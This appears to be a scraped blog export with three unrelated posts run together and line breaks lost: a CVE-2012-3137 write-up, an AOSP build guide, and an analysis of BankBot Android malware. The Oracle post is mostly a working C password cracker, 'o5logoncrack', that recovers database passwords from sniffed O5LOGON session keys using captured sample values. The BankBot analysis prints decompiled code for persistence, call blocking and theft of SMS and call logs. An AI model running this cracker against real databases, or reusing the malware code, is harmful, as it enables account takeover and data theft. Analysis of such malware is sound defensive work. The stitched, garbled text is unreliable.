C7248F0873F04B5A02E59178804BD361B0C77B20A4CF685460DA472996D5245745A791DFEA14399831EC62380808903CAUTH_PASSWORD: 8B4C7D85F421EBA059FDBA21F5708FD4D3BB8AB2168941243B5EF07681F3B80AAUTH_VFR_DATA: 3DA8A309D636ACF87004PASSWORD HASH: EF92924A1DB06441457FDABC24BF89055C8594F7 11.2 1234567PASSWORD : nsfocusAUTH_SESSKEY: 52FC04B1FF8110CA1263DF5BC61A7E57740C8A5111D22B41E53CC167FDF2A6878958200D9B2B6A51C95D779FDEBABB69AUTH_SESSKEY_C FA6DCD0F389E92D18F8188EC69313B524F421184FAE679613A72FC8DFD0A4C7BB93A6ACB8E05B8258A020D2954EC1B63AUTH_PASSWORD 2C5F957A6532AD91D916F4E5FA7D2FDA0E6CDFFBAAED883CAF4F200C8983AE3DAUTH_VFR_DATA 43E0BE20B32B0BB76E57PASSWORD HASH: C3D98762D258D4BD92C572065DDEA9AF38123F88 43E0BE20B32B0BB76E57 123456789101112131415161718aes key0000 ef 92 92 4a 1d b0 64 41 45 7f da bc 24 bf 89 050010 5c 85 94 f7 00 00 00 00decrypted_server_sesskey0000 47 43 56 45 1f 61 c7 89 68 83 be ad ed c0 f4 540010 e3 dd 61 88 7e 78 d8 9a bc 8f dc 15 4f a6 2f 260020 a0 35 e2 63 68 bb 02 1b 08 08 08 08 08 08 08 08encrypted_server_sesskey0000 43 fd 38 02 93 77 c8 46 20 ae 18 51 fc 1d 23 140010 09 98 50 64 de a0 d0 b8 d4 8e 50 e6 05 17 51 a50020 d8 fd fe aa a9 f8 3b 99 f3 7b 05 1f a6 7f 85 46AUTH_SESSKEY0000 43 fd 38 02 93 77 c8 46 20 ae 18 51 fc 1d 23 140010 09 98 50 64 de a0 d0 b8 d4 8e 50 e6 05 17 51 a50020 d8 fd fe aa a9 f8 3b 99 f3 7b 05 1f a6 7f 85 46 123456789101112131415161718aes key0000 c3 d9 87 62 d2 58 d4 bd 92 c5 72 06 5d de a9 af0010 38 12 3f 88 00 00 00 00decrypted_server_sesskey0000 21 64 7f ef 76 d3 ee 80 ed 24 47 50 f8 f4 f0 a60010 e4 18 a3 2a 40 0b 96 ea 5b 70 26 ab 6a e4 62 f50020 81 e0 62 1c 13 a0 21 90 08 08 08 08 08 08 08 08encrypted_server_sesskey0000 52 fc 04 b1 ff 81 10 ca 12 63 df 5b c6 1a 7e 570010 74 0c 8a 51 11 d2 2b 41 e5 3c c1 67 fd f2 a6 870020 89 58 20 0d 9b 2b 6a 51 c9 5d 77 9f de ba bb 69AUTH_SESSKEY0000 52 fc 04 b1 ff 81 10 ca 12 63 df 5b c6 1a 7e 570010 74 0c 8a 51 11 d2 2b 41 e5 3c c1 67 fd f2 a6 870020 89 58 20 0d 9b 2b 6a 51 c9 5d 77 9f de ba bb 69 exploit (POC)o5logoncrack.c 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286/* 11.1PASSWORD: nsfocusAUTH_SESSKEY: 43FD38029377C84620AE1851FC1D231409985064DEA0D0B8D48E50E6051751A5D8FDFEAAA9F83B99F37B051FA67F8546AUTH_SESSKEY_CLIENT: C7248F0873F04B5A02E59178804BD361B0C77B20A4CF685460DA472996D5245745A791DFEA14399831EC62380808903CAUTH_PASSWORD: 8B4C7D85F421EBA059FDBA21F5708FD4D3BB8AB2168941243B5EF07681F3B80AAUTH_VFR_DATA: 3DA8A309D636ACF87004PASSWORD HASH: EF92924A1DB06441457FDABC24BF89055C8594F711.2PASSWORD : nsfocusAUTH_SESSKEY: 52FC04B1FF8110CA1263DF5BC61A7E57740C8A5111D22B41E53CC167FDF2A6878958200D9B2B6A51C95D779FDEBABB69AUTH_SESSKEY_C FA6DCD0F389E92D18F8188EC69313B524F421184FAE679613A72FC8DFD0A4C7BB93A6ACB8E05B8258A020D2954EC1B63AUTH_PASSWORD 2C5F957A6532AD91D916F4E5FA7D2FDA0E6CDFFBAAED883CAF4F200C8983AE3DAUTH_VFR_DATA 43E0BE20B32B0BB76E57PASSWORD HASH: C3D98762D258D4BD92C572065DDEA9AF38123F88 43E0BE20B32B0BB76E5711.xED91B97A04000F326F17430A65DACB30CD1EF788E6EC310742B811E32112C0C9CC39554C9C01A090CB95E95C94140C2840E7B86C99F4BF1D0F17538C22EBCE054F5F677E2B521480F1F56143D047C00469A87049DE1B9CADDC8EA71392AD6E3A2D4FD970C12D9618742E4525C514105E0BE24DE75C04A0C4BF6DD46BE88A339E7FD52BC80AA5836695D418C314BE125DF23689215C78C33F623AABF1152E-------------------------------------aes key0000 ef 92 92 4a 1d b0 64 41 45 7f da bc 24 bf 89 050010 5c 85 94 f7 00 00 00 00decrypted_server_sesskey0000 47 43 56 45 1f 61 c7 89 68 83 be ad ed c0 f4 540010 e3 dd 61 88 7e 78 d8 9a bc 8f dc 15 4f a6 2f 260020 a0 35 e2 63 68 bb 02 1b 08 08 08 08 08 08 08 08encrypted_server_sesskey0000 43 fd 38 02 93 77 c8 46 20 ae 18 51 fc 1d 23 140010 09 98 50 64 de a0 d0 b8 d4 8e 50 e6 05 17 51 a50020 d8 fd fe aa a9 f8 3b 99 f3 7b 05 1f a6 7f 85 46AUTH_SESSKEY0000 43 fd 38 02 93 77 c8 46 20 ae 18 51 fc 1d 23 140010 09 98 50 64 de a0 d0 b8 d4 8e 50 e6 05 17 51 a50020 d8 fd fe aa a9 f8 3b 99 f3 7b 05 1f a6 7f 85 46----------------aes key0000 c3 d9 87 62 d2 58 d4 bd 92 c5 72 06 5d de a9 af0010 38 12 3f 88 00 00 00 00decrypted_server_sesskey0000 21 64 7f ef 76 d3 ee 80 ed 24 47 50 f8 f4 f0 a60010 e4 18 a3 2a 40 0b 96 ea 5b 70 26 ab 6a e4 62 f50020 81 e0 62 1c 13 a0 21 90 08 08 08 08 08 08 08 08encrypted_server_sesskey0000 52 fc 04 b1 ff 81 10 ca 12 63 df 5b c6 1a 7e 570010 74 0c 8a 51 11 d2 2b 41 e5 3c c1 67 fd f2 a6 870020 89 58 20 0d 9b 2b 6a 51 c9 5d 77 9f de ba bb 69AUTH_SESSKEY0000 52 fc 04 b1 ff 81 10 ca 12 63 df 5b c6 1a 7e 570010 74 0c 8a 51 11 d2 2b 41 e5 3c c1 67 fd f2 a6 870020 89 58 20 0d 9b 2b 6a 51 c9 5d 77 9f de ba bb 69------------------aes key0000 18 c3 14 be 12 5d f2 36 89 21 5c 78 c3 3f 62 3a0010 ab f1 15 2e 00 00 00 00decrypted_server_sesskey0000 07 eb ab db ee 3a 0e b0 ab e1 9f 68 12 c1 e3 e60010 5a e9 fd 7c b9 ca ae e2 fb 21 20 d4 af 83 de 0c0020 1e 12 dc 01 22 05 a0 75 08 08 08 08 08 08 08 08encrypted_server_sesskey0000 ed 91 b9 7a 04 00 0f 32 6f 17 43 0a 65 da cb 300010 cd 1e f7 88 e6 ec 31 07 42 b8 11 e3 21 12 c0 c90020 cc 39 55 4c 9c 01 a0 90 cb 95 e9 5c 94 14 0c 28AUTH_SESSKEY0000 ed 91 b9 7a 04 00 0f 32 6f 17 43 0a 65 da cb 300010 cd 1e f7 88 e6 ec 31 07 42 b8 11 e3 21 12 c0 c90020 cc 39 55 4c 9c 01 a0 90 cb 95 e9 5c 94 14 0c 28*/#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;openssl/aes.h&gt;#include &lt;openssl/md5.h&gt;#include &lt;openssl/sha.h&gt;#include &quot;getopt.h&quot;//*********************************************************************************************************************// Hashes captured on the network during authentication phase//unsigned char AUTH_SESSKEY [] = { 0x43,0xFD,0x38,0x02,0x93,0x77,0xC8,0x46,0x20,0xAE,0x18,0x51,0xFC,0x1D,0x23,0x14,0x09,0x98,0x50,0x64,0xDE,0xA0,0xD0,0xB8,0xD4,0x8E,0x50,0xE6,0x05,0x17,0x51,0xA5,0xD8,0xFD,0xFE,0xAA,0xA9,0xF8,0x3B,0x99,0xF3,0x7B,0x05,0x1F,0xA6,0x7F,0x85,0x46};////unsigned char AUTH_SESSKEY_C[] = { 0xC7,0x24,0x8F,0x08,0x73,0xF0,0x4B,0x5A,0x02,0xE5,0x91,0x78,0x80,0x4B,0xD3,0x61,0xB0,0xC7,0x7B,0x20,0xA4,0xCF,0x68,0x54,0x60,0xDA,0x47,0x29,0x96,0xD5,0x24,0x57,0x45,0xA7,0x91,0xDF,0xEA,0x14,0x39,0x98,0x31,0xEC,0x62,0x38,0x08,0x08,0x90,0x3C};////unsigned char AUTH_PASSWORD [] = { 0x8B,0x4C,0x7D,0x85,0xF4,0x21,0xEB,0xA0,0x59,0xFD,0xBA,0x21,0xF5,0x70,0x8F,0xD4,0xD3,0xBB,0x8A,0xB2,0x16,0x89,0x41,0x24,0x3B,0x5E,0xF0,0x76,0x81,0xF3,0xB8,0x0A };////unsigned char AUTH_VFR_DATA [] = { 0x3D,0xA8,0xA3,0x09,0xD6,0x36,0xAC,0xF8,0x70,0x04 };//unsigned char AUTH_SESSKEY [] = { 0x52,0xFC,0x04,0xB1,0xFF,0x81,0x10,0xCA,0x12,0x63,0xDF,0x5B,0xC6,0x1A,0x7E,0x57,0x74,0x0C,0x8A,0x51,0x11,0xD2,0x2B,0x41,0xE5,0x3C,0xC1,0x67,0xFD,0xF2,0xA6,0x87,0x89,0x58,0x20,0x0D,0x9B,0x2B,0x6A,0x51,0xC9,0x5D,0x77,0x9F,0xDE,0xBA,0xBB,0x69 };////unsigned char AUTH_SESSKEY_C[] = { 0xFA,0x6D,0xCD,0x0F,0x38,0x9E,0x92,0xD1,0x8F,0x81,0x88,0xEC,0x69,0x31,0x3B,0x52,0x4F,0x42,0x11,0x84,0xFA,0xE6,0x79,0x61,0x3A,0x72,0xFC,0x8D,0xFD,0x0A,0x4C,0x7B,0xB9,0x3A,0x6A,0xCB,0x8E,0x05,0xB8,0x25,0x8A,0x02,0x0D,0x29,0x54,0xEC,0x1B,0x63 };////unsigned char AUTH_PASSWORD [] = { 0x2C,0x5F,0x95,0x7A,0x65,0x32,0xAD,0x91,0xD9,0x16,0xF4,0xE5,0xFA,0x7D,0x2F,0xDA,0x0E,0x6C,0xDF,0xFB,0xAA,0xED,0x88,0x3C,0xAF,0x4F,0x20,0x0C,0x89,0x83,0xAE,0x3D };////unsigned char AUTH_VFR_DATA [] = { 0x43,0xE0,0xBE,0x20,0xB3,0x2B,0x0B,0xB7,0x6E,0x57 };////unsigned char AUTH_SESSKEY [] = { 0xED,0x91,0xB9,0x7A,0x04,0x00,0x0F,0x32,0x6F,0x17,0x43,0x0A,0x65,0xDA,0xCB,0x30,0xCD,0x1E,0xF7,0x88,0xE6,0xEC,0x31,0x07,0x42,0xB8,0x11,0xE3,0x21,0x12,0xC0,0xC9,0xCC,0x39,0x55,0x4C,0x9C,0x01,0xA0,0x90,0xCB,0x95,0xE9,0x5C,0x94,0x14,0x0C,0x28 }; //unsigned char AUTH_VFR_DATA [] = { 0x7F,0xD5,0x2B,0xC8,0x0A,0xA5,0x83,0x66,0x95,0xD4 }; //unsigned char AUTH_SESSKEY [] = { 0xBD,0x53,0x44,0x89,0x91,0xEE,0xAB,0x1E,0xCD,0x8D,0x32,0xFB,0x59,0x52,0x3F,0x0C,0xBD,0xB3,0x3B,0x40,0xC2,0x8F,0xEB,0xED,0xDD,0x5A,0xA3,0xA4,0xAF,0x0C,0xF6,0xB7,0x23,0x06,0x16,0x2D,0x3F,0x0C,0x1E,0x8D,0xB2,0x53,0x8A,0xF2,0x91,0xEC,0x01,0xA5};//unsigned char AUTH_VFR_DATA [] = { 0x03,0x1C,0xB4,0x72,0xC4,0xD9,0x04,0x12,0xDD,0x31 }; //*********************************************************************************************************************int HexStringtoBinArray(char* str, unsigned char* array){ int alen=strlen(str)/2; unsigned char t[2]; unsigned int hexc; int j=0; int i=0; for(;i&lt;strlen(str);i=i+2){ t[0]=str[i]; t[1]=str[i+1]; hexc = t[0]-48; if (hexc &gt; 9) hexc-=7; array[j]=hexc*16; hexc = t[1]-48; if (hexc &gt; 9) hexc-=7; array[j]+=hexc; j++; } return j;}static void hexdump( FILE *f, const char *title, const unsigned char *s,int l) { int n = 0; fprintf(f, &quot;%s&quot;, title); for (; n &lt; l; ++n) { if ((n % 16) == 0) { fprintf(f, &quot;\\n%04x&quot;, n); } fprintf(f, &quot; %02x&quot;, s[n]); } fprintf(f, &quot;\\n&quot;);}void ORACLE_MixCase_Hash (char *passwd, int passwd_len, unsigned char salt[10], unsigned char* oracle_mixcase_hash) { unsigned char to_hash[256]; SHA_CTX ctx; memcpy (to_hash, passwd, passwd_len); memcpy (to_hash+passwd_len, salt, 10); SHA1_Init (&amp;ctx); SHA1_Update (&amp;ctx, to_hash, passwd_len+10); SHA1_Final (oracle_mixcase_hash, &amp;ctx);}void ORACLE_TNS_Decrypt_AES192_CBC (unsigned char aes_key_bytes[24], unsigned char* input, int input_len, unsigned char* output) { unsigned char iv[] = {0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0}; AES_KEY key; AES_set_decrypt_key(aes_key_bytes, 192, &amp;key); AES_cbc_encrypt(input, output, input_len, &amp;key, iv, AES_DECRYPT);}void ORACLE_TNS_Encrypt_AES192_CBC (unsigned char aes_key_bytes[24], unsigned char* input, int input_len, unsigned char* output) { unsigned char iv[] = {0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0}; AES_KEY key; AES_set_encrypt_key(aes_key_bytes, 192, &amp;key); AES_cbc_encrypt(input, output, input_len, &amp;key, iv, AES_ENCRYPT);}void usage() { fprintf(stdout, &quot;o5logoncrack -k server sesskey -s salt -d dict\\n&quot;); exit(0);}int main(int argc, char* argv[]) { char password [100]; char aes_key_bytes[24] = {0}; char dict_filename[256] = {0}; unsigned char Oracle_MixCaseHash[20] = {0}; unsigned char decrypted_server_sesskey[48] = {0}; unsigned char encrypted_server_sesskey[48] = {0}; unsigned char AUTH_SESSKEY[48] = {0}; unsigned char AUTH_VFR_DATA[10] = {0}; int len; int ret; int debug = 0; FILE * fp = NULL; int ch; int args = 0; while( ( ch = getopt( argc, argv, &quot;k:s:d:v&quot; ) ) != EOF ) { switch(ch) { case 'k': HexStringtoBinArray(optarg, AUTH_SESSKEY); break; case 's': HexStringtoBinArray(optarg, AUTH_VFR_DATA); break; case 'd': strncpy(dict_filename, optarg, 255); break; case 'v': debug = 1; break; default: usage(); } args++; } if (args &lt; 3) usage(); printf (&quot;*************************************************************\\n&quot;); printf (&quot;Oracle 11g TNS AES-192 cracker by zz@nsfocus\\n&quot;); printf (&quot;*************************************************************\\n\\n&quot;); if ( (fp = fopen(dict_filename, &quot;r&quot;)) == NULL ) { perror(&quot;fail to read&quot;); exit(1); } while(fgets(password, 100, fp) != NULL) { len = strlen(password); if (password[len-1] == 0xa &amp;&amp; password[len-2] == 0xd) { password[len-2] = '\\0'; } else password[len-1] = '\\0'; if (debug) fprintf(stdout, &quot;try `%s'\\n&quot;, password); // Create Oracle Hash from the salt (AUTH_VFR_DATA) and the password ORACLE_MixCase_Hash (password, strlen (password), AUTH_VFR_DATA, Oracle_MixCaseHash); memset (aes_key_bytes,0,sizeof(aes_key_bytes)); memcpy (aes_key_bytes,Oracle_MixCaseHash, 20); if (debug) hexdump(stdout, &quot;aes_key_bytes&quot;, aes_key_bytes, sizeof(aes_key_bytes)); memset (decrypted_server_sesskey, 0, sizeof(decrypted_server_sesskey)); ORACLE_TNS_Decrypt_AES192_CBC (aes_key_bytes, AUTH_SESSKEY, 48, decrypted_server_sesskey); if (debug) hexdump(stdout, &quot;decrypted_server_sesskey&quot;, decrypted_server_sesskey, sizeof(decrypted_server_sesskey)); ret = strncmp(&amp;decrypted_server_sesskey[40], &quot;\\x08\\x08\\x08\\x08\\x08\\x08\\x08\\x08&quot;, 8); if (ret == 0) { printf (&quot;\\nFound password: %s \\n\\n&quot;, password); return 0; } memset(password, 0, sizeof(password)); } fclose(fp); return 0;} 参考链接 http://threatpost.com/en_us/blogs/flaw-oracle-logon-protocol-leads-easy-password-cracking-092012 http://www.soonerorlater.hu/index.khtml?article_id=512 http://marcel.vandewaters.nl/oracle/security/cryptographic-flaws-in-oracle-database-authentication-protocol http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2012-3137 http://www.openwall.com/lists/john-users/2012/09/28/1 http://marcel.vandewaters.nl/oracle/security/password-hashes","link":"/cn/cve-2012-3137/"},{"title":"编译 Android 系统源码  （AOSP）","text":"☆ 1. 下载源码由于众所周知的原因，国内访问 Android 源码不大方便， 清华大学做了一件好事， 弄了个 mirror。 https://mirrors.tuna.tsinghua.edu.cn/help/AOSP/ 下载 repoGoogle 自己搞一个源码同步工具，需要下下载。 1234mkdir ~/binPATH=~/bin:$PATHcurl https://storage.googleapis.com/git-repo-downloads/repo &gt; ~/bin/repochmod a+x ~/bin/repo 上面命令，下载 repo 并将 ~/bin 加入 PATH 环境变量 使用每月更新的初始化包123456wget -c https://mirrors.tuna.tsinghua.edu.cn/aosp-monthly/aosp-latest.tar # 下载初始化包tar xf aosp-latest.tarcd AOSP # 解压得到的 AOSP 工程目录# 这时 ls 的话什么也看不到，因为只有一个隐藏的 .repo 目录repo sync # 正常同步一遍即可得到完整目录# 或 repo sync -l 仅checkout代码 使用这个初始包的好处挺多，应该可以减少一些网络 IO 编译特定版本的 Android12repo init -u https://aosp.tuna.tsinghua.edu.cn/platform/manifest -b android-4.0.1_r1repo sync 其中版本号的对应关系可以从这个页面获得： https://source.android.com/setup/start/build-numbers 下载对应设备的 Driver BinaryPixel 2 就直接可以看这个 https://developers.google.com/android/drivers#walleye目前最新的两个链接为： https://dl.google.com/dl/android/aosp/google_devices-walleye-pq2a.190305.002-78f45eb0.tgz https://dl.google.com/dl/android/aosp/qcom-walleye-pq2a.190305.002-a7c70412.tgz 将这两个文件在 aosp 根目录解压 12tar zxvf google_devices-walleye-pq2a.190305.002-78f45eb0.tgztar zxvf qcom-walleye-pq2a.190305.002-a7c70412.tgz 将得到两个文件 extract-google_devices-walleye.sh 和 extract-qcom-walleye.sh这两个文件为自解压文件，直接执行即可。 12./extract-google_devices-walleye.sh./extract-qcom-walleye.sh ☆ 2. 编译源码切换到 aosp 根目录 1234make clobbersource build/envsetup.shlunch aosp_arm-engmake -j4 执行 lunch 可以看到支持的各种 build， 自行选择即可。编译成功后，将在 out/target/product/walleye/ 目录下生成镜像文件。 123456789-rw-rw-r-- 1 henices henices 33554432 3月 8 01:55 boot.img-rw-rw-r-- 1 henices henices 8388608 3月 7 17:56 dtbo.img-rw-rw-r-- 1 henices henices 1570048 3月 8 01:55 ramdisk.img-rw-rw-r-- 1 henices henices 8721730 3月 8 01:55 ramdisk-recovery.img-rw-rw-r-- 1 henices henices 1175523656 3月 8 02:17 system.img-rw-rw-r-- 1 henices henices 84722016 3月 8 02:15 system_other.img-rw-rw-r-- 1 henices henices 4952764 3月 8 01:28 userdata.img-rw-rw-r-- 1 henices henices 4096 3月 8 02:17 vbmeta.img-rw-r--r-- 1 henices henices 369635536 3月 7 16:42 vendor.img ☆ 3. 注意事项清华这个 mirror 是定时同步的，所以实时性并不好，如果遇到某个特定版本下载失败，可以等待一段时间后，再重新执行同步命令。编译时需要的内存比较大，小内存可能导致编译失败，另外，如果在虚拟机里编译的话，记得多设置几个CPU核，这样编译速度会快一些。 参考资料 https://mirrors.tuna.tsinghua.edu.cn/help/AOSP/ https://source.android.com/setup/build/downloading https://source.android.com/setup/build/building https://developers.google.com/android/drivers","link":"/cn/compile_android_source_code/"},{"title":"Bankbot APK 样本分析","text":"0x00 样本概况 字段 内容 样本名 BankBot MD5 3c42c391bec405bb28b28195c2961778 SHA256 93b64019ee48177889d908c393703a2a2fe05ca33793c14b175467ce619b1b94 文件类型 APK 这是一个以盗窃信用卡用户密码为主要目的的bot。安装后显示为Android图标。打开App后会以Android系统更新的形式，诱导用户操作达到常驻系统的目的。 0x01 行为分析开机自启动123456789101112&lt;receiver android:name=&quot;com.android.market.Autorun&quot;&gt; &lt;intent-filter android:priority=&quot;999&quot;&gt; &lt;action android:name=&quot;android.intent.action.REBOOT&quot; /&gt; &lt;action android:name=&quot;android.intent.action.BOOT_COMPLETED&quot; /&gt; &lt;action android:name=&quot;android.intent.action.QUICKBOOT_POWERON&quot; /&gt; &lt;/intent-filter&gt; &lt;intent-filter android:priority=&quot;1000&quot;&gt; &lt;action android:name=&quot;android.intent.action.REBOOT&quot; /&gt; &lt;action android:name=&quot;android.intent.action.BOOT_COMPLETED&quot; /&gt; &lt;action android:name=&quot;android.intent.action.QUICKBOOT_POWERON&quot; /&gt; &lt;/intent-filter&gt;&lt;/receiver&gt; Autorun 1234567891011121314151617package com.android.market;import android.content.BroadcastReceiver;import android.content.Context;import android.content.Intent;public final class Autorun extends BroadcastReceiver { public Autorun() { super(); } public void onReceive(Context context, Intent intent) { Intent v0 = new Intent(context, Scheduler.class); v0.setFlags(0x10000000); context.startService(v0); }} 开机将启动 Schedule 服务 Schedule 服务12345678910111213public int onStartCommand(Intent intent, int flags, int startId) { super.onStartCommand(intent, flags, startId); Utils.registerIfNeeded(((Context)this)); Object v0 = this.getSystemService(&quot;alarm&quot;); PendingIntent v6 = PendingIntent.getBroadcast(((Context)this), 0, new Intent(((Context)this), NetworkController.class), 0); int v7 = FileController.fileExists(((Context)this), &quot;interval&quot;) ? Integer.parseInt(FileController .readFile(((Context)this), &quot;interval&quot;)) : 0xA; ((AlarmManager)v0).setRepeating(0, System.currentTimeMillis() + 0x2710, ((long)(v7 * 0x3E8)), v6); this.handleCrashes(); return 1;} Schedule 服务使用alarm manager 注册一个定时任务。这个定时任务由NetworkController完成。时间间隔由配置文件interval决定。 com.android.market.FileController 123static final boolean fileExists(Context context, String filename) { return new File(context.getFilesDir(), filename).exists();} 隐藏App 图标1234567static final void hideApp(Context context, boolean hide) { ComponentName v0 = new ComponentName(context.getPackageName(), String.valueOf(context.getPackageName()) + &quot;.MainActivity&quot;); PackageManager v3 = context.getPackageManager(); int v1 = hide ? 2 : 1; v3.setComponentEnabledSetting(v0, v1, 1);} 伪造的系统Notification1234567891011121314public void onCreate() { super.onCreate(); new AppCrash().Register(((Context)this)); Notification v3 = new Notification(0x108008A, &quot;Android system requires user action&quot;, System. currentTimeMillis()); Intent v1 = new Intent(this.getApplicationContext(), AdminX.class); v1.setAction(&quot;android.intent.action.VIEW&quot;); v1.setFlags(0x34000000); v3.setLatestEventInfo(this.getBaseContext(), &quot;Android&quot;, &quot;Android system requires action&quot;, PendingIntent .getActivity(((Context)this), 0, v1, 0x8000000)); v3.flags |= 0x62; this.startForeground(2, v3); new Helper(this).execute(new Void[0]);} 禁用屏幕锁定1AdminX.this.getSystemService(&quot;keyguard&quot;).newKeyguardLock(&quot;ANDROID&quot;).disableKeyguard(); 禁止拨打指定号码电话123456789101112131415161718192021222324252627282930313233343536public void onReceive(Context context, Intent intent) { String[] v8; String action = intent.getAction(); String v6 = intent.getStringExtra(&quot;state&quot;); String v3 = intent.getStringExtra(&quot;incoming_number&quot;); String v5 = intent.getStringExtra(&quot;android.intent.extra.PHONE_NUMBER&quot;); String v1 = &quot;8005555550; 4955005550;&quot;; String v10 = &quot;8005555550; 4955005550;&quot;; String v11 = &quot;&quot;; int v9 = 0; if(action.equals(&quot;android.intent.action.NEW_OUTGOING_CALL&quot;)) { String v4 = v5.replace(&quot;+&quot;, &quot;&quot;).replace(&quot;#&quot;, &quot;d&quot;).replace(&quot;*&quot;, &quot;s&quot;).replace(&quot; &quot;, &quot;&quot;).replace( &quot;-&quot;, &quot;&quot;); if(v1 != null) { v8 = v1.replace(&quot; &quot;, &quot;&quot;).split(&quot;;&quot;); if(v8.length &gt; 0) { int v13; for(v13 = 0; v13 &lt; v8.length; ++v13) { if(v4.contains(v8[v13])) { v9 = 1; v11 = String.valueOf(v11) + &quot;blocked outgoing call&quot;; this.setResultData(null); } } } } if(v9 == 0) { v11 = String.valueOf(v11) + &quot;outgoing call&quot;; } new ReportWithDataTask(context, &quot;call_data&quot;).execute(new Object[]{&quot;[&quot; + this.toJSON(v4, v11) + &quot;]&quot;}); } ... } 通过网页 http://www.sberbank.com/news-and-media/contacts 中的信息我们可以知道： 8005555550 4955005550 这两个号码 sberbank 的号码，在俄罗斯拨打免费。 禁止接听指定号码电话123456789101112131415161718192021222324252627282930313233String v10 = &quot;8005555550; 4955005550;&quot;;if((action.equals(&quot;android.intent.action.PHONE_STATE&quot;)) &amp;&amp; (v6.equals(&quot;RINGING&quot;))) {String v2 = v3 != null ? v3.replace(&quot;+&quot;, &quot;&quot;).replace(&quot;#&quot;, &quot;d&quot;).replace(&quot;*&quot;, &quot;s&quot;).replace( &quot; &quot;, &quot;&quot;).replace(&quot;-&quot;, &quot;&quot;) : &quot;Unknown&quot;;if(v10 != null) { v8 = v10.replace(&quot; &quot;, &quot;&quot;).split(&quot;;&quot;); for(v13 = 0; v13 &lt; v8.length; ++v13) { if(v2.contains(v8[v13])) { v11 = &quot;blocked incoming call&quot;; v9 = 1; this.hangUp(context); } } if(!v2.contains(&quot;Unknown&quot;)) { goto label_106; } v11 = &quot;blocked incoming call&quot;; v9 = 1; this.hangUp(context);}label_106:if(v9 == 0) { v11 = &quot;incoming call&quot;;}new ReportWithDataTask(context, &quot;call_data&quot;).execute(new Object[]{&quot;[&quot; + this.toJSON(v2, v11) + &quot;]&quot;});} 隐私窃取获取电话拨打记录12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849private StringBuilder getCallLog() { StringBuilder v20 = new StringBuilder(&quot;[&quot;); String v18 = &quot;O||U|T||||G|O|||I|N||G|&quot;.replace(&quot;|&quot;, &quot;&quot;); Cursor v10 = this.context.getContentResolver().query(CallLog$Calls.CONTENT_URI, null, null, null, null); String v15 = &quot;I++N+C+O+++M+I++N+G+&quot;.replace(&quot;+&quot;, &quot;&quot;); String v16 = &quot;M-I--S--S---E--D---&quot;.replace(&quot;-&quot;, &quot;&quot;); String v22 = &quot;***{\\&quot;n*u**mb**e*r\\&quot;***:%s,\\&quot;da****te\\&quot;:%s,\\&quot;d*u*ra****ti*o***n\\&quot;:%s,\\&quot;t*yp***e\\&quot;:%s}*&quot; .replace(&quot;*&quot;, &quot;&quot;); if((v10.moveToFirst()) &amp;&amp; v10.getCount() &gt; 0) { int v17 = v10.getColumnIndex(&quot;number&quot;); int v21 = v10.getColumnIndex(&quot;type&quot;); int v11 = v10.getColumnIndex(&quot;date&quot;); int v14 = v10.getColumnIndex(&quot;duration&quot;); while(!v10.isAfterLast()) { String v19 = v10.getString(v17); String v9 = v10.getString(v21); String v7 = v10.getString(v11); String v8 = v10.getString(v14); String v13 = null; switch(Integer.parseInt(v9)) { case 1: { v13 = v15; break; } case 2: { v13 = v18; break; } case 3: { v13 = v16; break; } } v20.append(String.format(Locale.US, v22, JSONObject.quote(v19), JSONObject.quote( v7), JSONObject.quote(v8), JSONObject.quote(v13))); if(!v10.isLast()) { v20.append(&quot;,&quot;); } v10.moveToNext(); } v10.close(); } return v20.append(&quot;]&quot;);} 获取短信记录12345678910111213141516171819202122private StringBuilder getSmsLog() { StringBuilder v10 = new StringBuilder(&quot;[&quot;); Cursor v8 = this.context.getContentResolver().query(Uri.parse(&quot;content://ABC&quot;.replace(&quot;A&quot;, &quot;s&quot;).replace(&quot;B&quot;, &quot;m&quot;).replace(&quot;C&quot;, &quot;s&quot;)), null, null, null, null); if((v8.moveToFirst()) &amp;&amp; v8.getCount() &gt; 0) { while(!v8.isAfterLast()) { v10.append(String.format(Locale.US, &quot;{\\&quot;address\\&quot;:%s,\\&quot;body\\&quot;:%s,\\&quot;date\\&quot;:%s}&quot;, JSONObject.quote(v8.getString(v8.getColumnIndex(&quot;address&quot;))), JSONObject .quote(v8.getString(v8.getColumnIndex(&quot;body&quot;))), JSONObject.quote(v8.getString( v8.getColumnIndex(&quot;date&quot;))))); if(!v8.isLast()) { v10.append(&quot;,&quot;); } v8.moveToNext(); } v8.close(); } return v10.append(&quot;]&quot;);} 浏览器书签1234567891011121314151617181920212223private StringBuilder getHistory(Uri historyUri) { StringBuilder v8 = new StringBuilder(&quot;[&quot;); Cursor v6 = this.context.getContentResolver().query(historyUri, new String[]{&quot;title&quot;, &quot;url&quot;, &quot;date&quot;}, &quot;bookmark = 0&quot;, null, null); if((v6.moveToFirst()) &amp;&amp; v6.getCount() &gt; 0) { while(!v6.isAfterLast()) { v8.append(String.format(Locale.US, &quot;{\\&quot;title\\&quot;:%s,\\&quot;url\\&quot;:%s,\\&quot;date\\&quot;:%s}&quot;, JSONObject .quote(v6.getString(v6.getColumnIndex(&quot;title&quot;))), JSONObject.quote(v6.getString( v6.getColumnIndex(&quot;url&quot;))), JSONObject.quote(v6.getString(v6.getColumnIndex( &quot;date&quot;))))); if(!v6.isLast()) { v8.append(&quot;,&quot;); } v6.moveToNext(); } v6.close(); } return v8.append(&quot;]&quot;);} 骗取信用卡信息当用户打开Google Play 应用时，打开伪造的Activity，诱使用户输入信用卡信息。 高级技术不断重启的Servciecom.android.smali3 1234public void onDestroy() { super.onDestroy(); this.startService(new Intent(this.getApplicationContext(), smali3.class));} 服务被停止，立即重启，无法停止。 防止卸载Bankbot 申请 Device Admin 权限，无法被正常卸载。 123&gt; adb shell pm uninstall com.android.marketFailure 禁止删除 Device Admin 